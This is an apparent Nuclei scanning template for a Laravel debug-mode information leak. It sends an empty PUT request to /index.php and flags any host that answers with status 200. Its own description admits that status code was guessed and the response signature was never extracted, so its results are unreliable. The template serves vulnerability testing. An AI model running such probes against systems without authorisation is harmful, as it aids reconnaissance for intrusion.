id: poc-2f130d7daa9c166d794e
info:
  name: laravel开启debug模式信息泄露漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: info-leak,2025
http:
- raw:
  - 'PUT /index.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36

    Connection: close

    Accept-Encoding: gzip, deflate

    Content-Length: 0'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
